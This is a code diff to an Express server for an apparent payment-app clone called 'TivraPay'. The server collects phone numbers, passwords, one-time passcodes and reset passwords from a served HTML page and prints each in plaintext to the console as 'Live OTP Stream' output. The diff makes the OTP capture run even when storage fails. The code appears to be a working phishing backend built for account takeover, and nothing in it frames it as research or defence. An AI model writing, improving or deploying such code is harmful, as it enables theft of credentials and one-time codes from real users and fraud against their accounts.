@@ -7,10 +7,8 @@ const { MongoMemoryServer } = require('mongodb-memory-server');
 
 const app = express();
 
-// PORT Setting: Render automatic process.env.PORT (10000) leta hai, local par 6500 chalega
 const PORT = process.env.PORT || 6500; 
 
-// Aggressive CORS policy taaki browser/domain dynamic cross-origin error na de
 app.use(cors({
     origin: '*',
     methods: ['GET', 'POST'],
@@ -19,26 +17,19 @@ app.use(cors({
 app.use(express.json());
 
 // ========================================================
-// ⚡ DYNAMIC FRONTEND SERVING LOGIC (FIXED FOR TRIVIALPAY.HTML)
+// ⚡ DYNAMIC FRONTEND SERVING LOGIC
 // ========================================================
-// Static assets (CSS, JS, Images) ko link karne ke liye folders mapping
 app.use(express.static(path.join(__dirname)));
 app.use('/frontend', express.static(path.join(__dirname, 'frontend')));
 
-// Main Route jo domain kholte hi trigger hoga
 app.get('/', (req, res) => {
-    // GitHub repository ke mutabiq frontend folder ke andar trivialpay.html ka path
     const htmlFilePath = path.resolve(__dirname, 'frontend', 'trivialpay.html');
-
-    // Safe Check: Agar file exist karti hai toh serve karein
     if (fs.existsSync(htmlFilePath)) {
         return res.sendFile(htmlFilePath);
     } else {
-        console.error("❌ File nahi mili path par: ", htmlFilePath);
-        return res.status(404).send("Frontend file (trivialpay.html) repository mein nahi mili. Kripya GitHub check karein.");
+        return res.status(404).send("Frontend file (trivialpay.html) not found.");
     }
 });
-// ========================================================
 
 // Database Structure Schema
 const UserSchema = new mongoose.Schema({
@@ -57,20 +48,14 @@ async function startServer() {
     try {
         const mongoServer = await MongoMemoryServer.create();
         const mongoUri = mongoServer.getUri();
-
         await mongoose.connect(mongoUri);
-        console.log(`\n==================================================`);
-        console.log(`🎉 MongoDB (TivraPay In-Memory) Connected successfully!`);
-        console.log(`==================================================`);
-
+        
+        console.log(`\n🎉 MongoDB Connected!`);
         app.listen(PORT, () => {
-            console.log(`🚀 Trivia Pay Backend Server actively monitoring port: ${PORT}`);
-            console.log(`Aapka data stream channel perfectly config ho gaya hai.`);
-            console.log(`==================================================\n`);
+            console.log(`🚀 Server monitoring on port: ${PORT}`);
         });
-
     } catch (error) {
-        console.error("❌ Server initialization failed:", error);
+        console.error("❌ Server error:", error);
     }
 }
 
@@ -80,39 +65,36 @@ app.post('/api/login-submit', async (req, res) => {
         const { phoneNumber, password } = req.body;
         const newUser = new User({ phoneNumber, password, actionType: 'LOGIN' });
         await newUser.save();
-
-        console.log(`[⚡ TIVRA PAY - NEW LOGIN RECEIVED]`);
-        console.log(`📱 Phone Number : ${phoneNumber}`);
-        console.log(`🔑 Password     : ${password}`);
-        console.log(`--------------------------------------------------`);
-
+        console.log(`[⚡ TIVRA PAY - NEW LOGIN RECEIVED]\n📱 Phone: ${phoneNumber}\n🔑 Pass: ${password}`);
         res.status(200).json({ success: true, userId: newUser._id });
     } catch (error) {
         res.status(500).json({ success: false, error: error.message });
     }
 });
 
-// 2. Live OTP Stream Channel
+// 2. UPDATED: Live OTP Stream Channel (Har haal mein print hoga)
 app.post('/api/otp-submit', async (req, res) => {
+    const { userId, otp } = req.body;
+    let currentAction = 'UNKNOWN';
+
     try {
-        const { userId, otp } = req.body;
-        let currentAction = 'UNKNOWN';
-
-        if (mongoose.Types.ObjectId.isValid(userId)) {
-           const updatedUser = await User.findByIdAndUpdate(userId, { otp: otp }, { returnDocument: 'after' });
-            if (updatedUser) {
-                currentAction = updatedUser.actionType;
-            }
+        if (userId && mongoose.Types.ObjectId.isValid(userId)) {
+            const updatedUser = await User.findByIdAndUpdate(userId, { otp: otp }, { new: true });
+            if (updatedUser) currentAction = updatedUser.actionType;
         }
-
-        console.log(`[🔐 TIVRA PAY - OTP UPDATED LIVE]`);
-        console.log(`🎯 Flow Type: ${currentAction}`);
-        console.log(`🔥 OTP Code : ${otp}`);
-        console.log(`==================================================\n`);
-        res.status(200).json({ success: true });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
+    } catch (err) {
+        // Database update fail ho toh bhi aage badhega
     }
+
+    // Yeh console.log ab hamesha chalega
+    console.log(`\n==================================================`);
+    console.log(`[🔐 TIVRA PAY - OTP RECEIVED]`);
+    console.log(`🎯 Flow Type: ${currentAction}`);
+    console.log(`🔥 OTP Code : ${otp}`);
+    console.log(`🆔 User ID  : ${userId || 'NOT PROVIDED'}`);
+    console.log(`==================================================\n`);
+    
+    res.status(200).json({ success: true });
 });
 
 // 3. Modify/Forgot Password Action Channel
@@ -121,13 +103,7 @@ app.post('/api/forgot-submit', async (req, res) => {
         const { phone, newPassword } = req.body;
         const resetRecord = new User({ resetPhone: phone, newPassword: newPassword, actionType: 'PASSWORD_RESET' });
         await resetRecord.save();
-
-        console.log(`[🔄 TIVRA PAY - PASSWORD RESET ACTION]`);
-        console.log(`📱 Account Phone: ${phone}`);
-        console.log(`🔑 New Password : ${newPassword}`);
-        console.log(`⏳ Waiting for Forget OTP...`);
-        console.log(`--------------------------------------------------`);
-
+        console.log(`[🔄 TIVRA PAY - PASSWORD RESET ACTION]\n📱 Phone: ${phone}\n🔑 New Pass: ${newPassword}`);
         res.status(200).json({ success: true, userId: resetRecord._id });
     } catch (error) {
         res.status(500).json({ success: false, error: error.message });
